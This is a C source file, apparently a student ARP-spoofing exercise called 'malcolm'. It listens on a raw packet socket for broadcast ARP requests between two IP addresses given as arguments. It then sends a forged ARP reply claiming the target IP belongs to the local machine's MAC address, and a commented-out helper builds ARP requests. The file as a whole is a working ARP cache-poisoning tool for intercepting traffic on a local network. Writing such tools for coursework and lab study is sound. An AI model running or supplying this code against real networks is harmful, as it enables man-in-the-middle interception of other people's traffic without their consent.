#include "malcolm.h"

int main(int argc, char *argv[]) 
{
    (void) argc;
    struct sockaddr_in srcaddr, targetaddr;
    struct sockaddr_in *target;
    struct ifaddrs *ifaddr, *ifa ;
    struct sockaddr_ll *s;
    char buffer[65536];
    int sockfd;
    int index_interface;
    
    // SOCK_RAW for direct packet manipulation
    sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if(sockfd < 0)
    {
        printf("error socket: %s",strerror(errno));
        return(errno);
    }

    //fill the address source and target
    fill_addr(&srcaddr, argv[1]);
    fill_addr(&targetaddr, argv[2]);

    // retrieve my local network address into a link list
    if(getifaddrs(&ifaddr) == -1)
    {
        printf("error on getting addr: %s\n", strerror(errno));
        return(errno);
    }
    //iterate through my link list
    for(ifa = ifaddr; ifa; ifa = ifa->ifa_next)
    {
        //try to found enx ip address
        if(ifa->ifa_addr && ifa->ifa_addr->sa_family == AF_INET && ft_strnstr(ifa->ifa_name, "enx", ft_strlen(ifa->ifa_name)))
        {
            //stock the actual ip address
            target = (struct sockaddr_in*)ifa->ifa_addr;
            //convert it to readable string
            inet_ntop(AF_INET, &target->sin_addr, buffer, 1024);
            index_interface = if_nametoindex(ifa->ifa_name);
            if(index_interface == 0)
            {
                return(printf("error index %s\n", strerror(errno)), 1);
            }
            //print the interface
            printf("Interface : %s \t Address: %s\n", ifa->ifa_name, buffer);
        }
        //retrieve the mac address in a sockaddr_ll structure
        if (ifa->ifa_addr->sa_family == AF_PACKET && ifa->ifa_data && ft_strnstr(ifa->ifa_name, "enx", ft_strlen(ifa->ifa_name))) {
        {
            s = (struct sockaddr_ll *)ifa->ifa_addr;
            //print the interface
            printf("Interface MAC: %s \t MAC: ", ifa->ifa_name);
            for (int i = 0; i < s->sll_halen; i++) {
                printf("%x%s", (unsigned char)s->sll_addr[i], (i + 1 != s->sll_halen) ? ":" : "");
            }
            printf("\n");
        }
        }
    }

    printf("listening...\n");
    while(1) {
        ssize_t packet_len = recvfrom(sockfd, buffer, sizeof(buffer), 0, NULL, NULL);

        if(packet_len == -1) {
            perror("Packet receive failed");
            continue;
        }

        // cast the buffer from the actual packet into an eth structure
        //eth struct contain both source and dest MAC adress
        struct ethhdr *eth = (struct ethhdr *)buffer;
        //check if its an ARP packet
        if(ntohs(eth->h_proto) == ETH_P_ARP) 
        {
            struct  arp_header *arp = (struct arp_header *)(buffer + sizeof(struct ethhdr));
            unsigned int uintsrc = (arp->sender_ip[3] << 24) | (arp->sender_ip[2] << 16) | (arp->sender_ip[1] << 8) | arp->sender_ip[0];
            unsigned int uinttarg = (arp->target_ip[3] << 24) | (arp->target_ip[2] << 16) | (arp->target_ip[1] << 8) | arp->target_ip[0];

            if(uintsrc == srcaddr.sin_addr.s_addr && uinttarg == targetaddr.sin_addr.s_addr) // detection de l'addresse ip source et dest corresponsant aux argv
            {
                if(eth->h_dest[0] == 0xFF && eth->h_dest[1] == 0xFF && eth->h_dest[2] == 0xFF &&
                    eth->h_dest[3] == 0xFF && eth->h_dest[4] == 0xFF && eth->h_dest[5] == 0xFF)
                {
                    // Receiving packet
                    printf("ARP packet received:\n");
                    printf("  Source MAC: ");
                    print_mac(eth->h_source);
                    printf("  Dest MAC: ");
                    print_mac(eth->h_dest);
                    printf("  Sender IP: %d.%d.%d.%d\n", arp->sender_ip[0], arp->sender_ip[1], arp->sender_ip[2], arp->sender_ip[3]);
                    printf("  Target IP: %d.%d.%d.%d\n", arp->target_ip[0], arp->target_ip[1], arp->target_ip[2], arp->target_ip[3]);
                    
                    // sending packet
                    unsigned char buffersend[42];
                    struct ethhdr *ethsend = (struct ethhdr *)buffersend;
                    struct arp_header *arpsend = (struct arp_header *)(buffersend + sizeof(struct ethhdr));
                    struct sockaddr_ll address_response;

                    //eth header
                    ethsend->h_proto = htons(ETH_P_ARP); // PROTOCOLE ARP
                    ft_memcpy(ethsend->h_dest, eth->h_source, ETH_ALEN); // MAC dest
                    ft_memcpy(ethsend->h_source, s->sll_addr, ETH_ALEN); // MAC source
                    
                    //arp header
                    printf("\n-------RESPONSE--------\n");
                    arpsend->hardware_type = htons(1);
                    arpsend->protocol_type = htons(ETH_P_IP);
                    arpsend->hardware_len = 6; // mac length
                    arpsend->protocol_len = 4; // ip length
                    arpsend->opcode = htons(0x02); // response ARP
                    ft_memcpy(arpsend->sender_mac, s->sll_addr, ETH_ALEN); // fill with my MAC
                    ft_memcpy(arpsend->sender_ip, &targetaddr.sin_addr.s_addr, 4); // fill with initial target IP
                    ft_memcpy(arpsend->target_mac, arp->sender_mac, ETH_ALEN); // SRC MAC
                    ft_memcpy(arpsend->target_ip, arp->sender_ip, 4); // SRC IP
                    print_mac(arpsend->sender_mac);
                    print_mac(arpsend->target_mac);
                    print_uchar(arpsend->sender_ip);
                    print_uchar(arpsend->target_ip);

                    //address header
                    address_response.sll_family = AF_PACKET;
                    address_response.sll_protocol = htons(ETH_P_ARP);
                    address_response.sll_ifindex = index_interface;
                    address_response.sll_hatype = htons(1);
                    address_response.sll_halen = 6;
                    ft_memcpy(address_response.sll_addr, eth->h_source, ETH_ALEN); // MAC SOURCE 
                    address_response.sll_addr[6] = 0x00;
                    address_response.sll_addr[7] = 0x00;
                    
                    int size = sendto(sockfd, buffersend, 42, 0, (struct sockaddr *)&address_response, sizeof(address_response));
                    if(size < 0)
                        return(printf("Error sending packet: %s\n", strerror(errno)), 1);
                    else
                        printf("****SUCCESS REPLY: %d bytes****\n\n", size);
                }
            }
        }
    }
    close(sockfd);
    freeifaddrs(ifaddr);
    return(0);
}

// int send_arp(int fd, int ifindex, const unsigned char *src_mac, uint32_t src_ip, uint32_t dst_ip)
// {
//     int err = -1;
//     unsigned char buffer[BUF_SIZE];
//     memset(buffer, 0, sizeof(buffer));

    // struct sockaddr_ll socket_address;
//     socket_address.sll_family = AF_PACKET;
//     socket_address.sll_protocol = htons(ETH_P_ARP);
//     socket_address.sll_ifindex = ifindex;
    // socket_address.sll_hatype = htons(ARPHRD_ETHER);
//     socket_address.sll_pkttype = (PACKET_BROADCAST);
//     socket_address.sll_halen = MAC_LENGTH;
//     socket_address.sll_addr[6] = 0x00;
//     socket_address.sll_addr[7] = 0x00;

//     struct ethhdr *send_req = (struct ethhdr *) buffer;
//     struct arp_header *arp_req = (struct arp_header *) (buffer + ETH2_HEADER_LEN);
//     int index;
//     ssize_t ret, length = 0;

//     //Broadcast
//     memset(send_req->h_dest, 0xff, MAC_LENGTH);

//     //Target MAC zero
//     memset(arp_req->target_mac, 0x00, MAC_LENGTH);

//     //Set source mac to our MAC address
//     memcpy(send_req->h_source, src_mac, MAC_LENGTH);
//     memcpy(arp_req->sender_mac, src_mac, MAC_LENGTH);
//     memcpy(socket_address.sll_addr, src_mac, MAC_LENGTH);

//     /* Setting protocol of the packet */
//     send_req->h_proto = htons(ETH_P_ARP);

//     /* Creating ARP request */
//     arp_req->hardware_type = htons(HW_TYPE);
//     arp_req->protocol_type = htons(ETH_P_IP);
//     arp_req->hardware_len = MAC_LENGTH;
//     arp_req->protocol_len = IPV4_LENGTH;
//     arp_req->opcode = htons(ARP_REQUEST);

//     debug("Copy IP address to arp_req");
//     memcpy(arp_req->sender_ip, &src_ip, sizeof(uint32_t));
//     memcpy(arp_req->target_ip, &dst_ip, sizeof(uint32_t));

//     ret = sendto(fd, buffer, 42, 0, (struct sockaddr *) &socket_address, sizeof(socket_address));
//     if (ret == -1) {
//         perror("sendto():");
//         goto out;
//     }
//     err = 0;
// out:
//     return err;
// }